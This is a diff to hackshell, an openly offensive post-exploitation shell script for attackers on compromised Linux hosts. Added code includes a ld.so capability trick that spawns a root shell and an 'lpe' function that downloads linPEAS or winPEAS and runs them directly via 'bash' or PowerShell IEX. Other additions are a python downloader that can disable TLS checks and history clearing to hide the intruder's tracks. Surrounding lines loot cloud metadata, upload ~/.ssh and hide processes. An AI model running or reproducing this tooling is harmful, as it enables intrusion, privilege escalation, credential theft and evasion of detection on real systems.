@@ -11,11 +11,11 @@
 #
 # Usage:
 #     source <(curl -SsfL https://thc.org/hs)
+#     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
 #
-# https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/hackshell.sh
 # 2024 by theM0ntarCann0n & skpr
 
 CY="\033[1;33m" # yellow
@@ -456,10 +456,10 @@ bin() {
     }
     unset _HS_SINGLE_MATCH
     [ -n "$is_showhelp" ] && {
-        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to ignore systemwide binaries" 
+        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
         echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
-        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line
->>> options from your current shell and all further processes."
+        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options
+>>> from your current shell and all further processes."
         echo -e ">>> ${CDG}Download COMPLETE${CN}"
     }
 
@@ -508,7 +508,7 @@ _loot_openstack() {
     [ -n "$_HS_NOT_OPENSTACK" ] && return
     [ -n "$_HS_NO_SSRF_169" ] && return
 
-    str="$(timeout 4 "${DL[@]}" "http://169.254.169.254/openstack/latest/user_data" 2>/dev/null)" || {
+    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
         [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
         unset str
     }
@@ -519,7 +519,7 @@ _loot_openstack() {
     echo -e "${CB}OpenStack user_data${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
-    echo -e "${CW}TIP: ${CDC}"'"${DL[@]}" "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
+    echo -e "${CW}TIP: ${CDC}"'dl "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
 }
 
 # FIXME: Search through environment variables of all running processes.
@@ -584,6 +584,17 @@ lootlight() {
             echo "${str}"
             echo -en "${CN}"
             echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+        }
+
+        str="$( { readlink -f /lib64/ld-*.so.* || readlink -f /lib/ld-*.so.* || readlink -f /lib/ld-linux.so.2; } 2>/dev/null )"
+        [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
+            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
+            getcap "${str}" 2>/dev/null
+            echo -en "${CN}"
+            # BUG: Linux yells 'Inconsistency detected by ld.so: rtld.c: 1327: _dl_start_args_adjust: Assertion `auxv == sp + 1' failed!'
+            # if TMPDIR=/dev/shm and ld.so is used to load binary.
+            echo -en "${CW}TIP: ${CDC}unset TMPDIR; $str $(command -v "${HS_PY:-python}") -c"
+            echo "\$'import os\ntry:\n\tos.setuid(0)\n\tos.setgid(0)\nexcept:\n\tpass\n''"'os.execl("/bin/bash", "-bash");'"'"
         }
     }
 
@@ -666,6 +677,33 @@ loot() {
     lootlight
 }
 
+# Try to find LPE
+# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
+lpe() {
+    # Detect the OS
+    OS="$(uname -s)"
+    case "$OS" in
+        Linux|Darwin)
+            echo -e "${CB}Running linPEAS...${CN}"
+            dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
+            ;;
+        CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
+            echo -e "${CB}Running winPEAS...${CN}"
+            if command -v powershell >/dev/null 2>&1; then
+                echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
+                powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
+            else
+                echo -e "${CR}Error: PowerShell is not available to run winPEAS.${CN}"
+                return 1
+            fi
+            ;;
+        *)
+            echo -e "${CR}Error: Unsupported operating system: $OS.${CN}"
+            return 1
+            ;;
+    esac
+}
 
 ws() {
     dl https://thc.org/ws | bash
@@ -762,7 +800,6 @@ hs_init_dl() {
             [ -n "$UNSAFE" ] && opts=("-k")
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
         }
-        DL=("curl" "-fsSL" "${opts[@]}" "--connect-timeout" "7" "--retry" "3")
     elif command -v wget >/dev/null; then
         _HS_SSL_ERR="is not trusted"
         dl() {
@@ -771,10 +808,20 @@ hs_init_dl() {
             # Can not use '-q' here because that also silences SSL/Cert errors
             wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
         }
-        DL=("wget" "-q" "-O-" "${opts[@]}" "--connect-timeout=7" "--dns-timeout=7")
+    elif [ -n "$HS_PY" ]; then
+        dl() {
+            local opts="timeout=10"
+            local opts_init
+            local url
+            [ -n "$UNSAFE" ] && {
+                opts_init="import ssl;ctx = ssl.create_default_context();ctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;"
+                opts+=", context=ctx"
+            }
+            url="'${1:?}'"
+            "$HS_PY" -c "import urllib.request;${opts_init}print(urllib.request.urlopen($url, $opts).read().decode('utf-8'))"
+        }
     else
-        dl() { HS_ERR "Not found: curl, wget"; }
-        DL=("false")
+        dl() { HS_ERR "Not found: curl, wget, python"; }
     fi
 }
 
@@ -881,9 +928,10 @@ hs_init_alias() {
 }
 
 hs_init_shell() {
-    unset HISTFILE
+    unset HISTFILE LC_TERMINAL LC_TERMINAL_VERSION
     [ -n "$BASH" ] && export HISTFILE="/dev/null"
     export BASH_HISTORY="/dev/null"
+    history -c 2>/dev/null
     export LANG=en_US.UTF-8
     locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
     export LESSHISTFILE=-
@@ -918,6 +966,7 @@ ${CDC} xssh                                  ${CDM}Silently log in to remote hos
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
+${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
@@ -933,14 +982,13 @@ ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP
 ${CDC} hide <pid>                            ${CDM}Hide a process
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
+${CDC} lpe                                   ${CDM}Run linPEAS
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
 }
-
-
 
 ### Programm
 hs_init "$0"
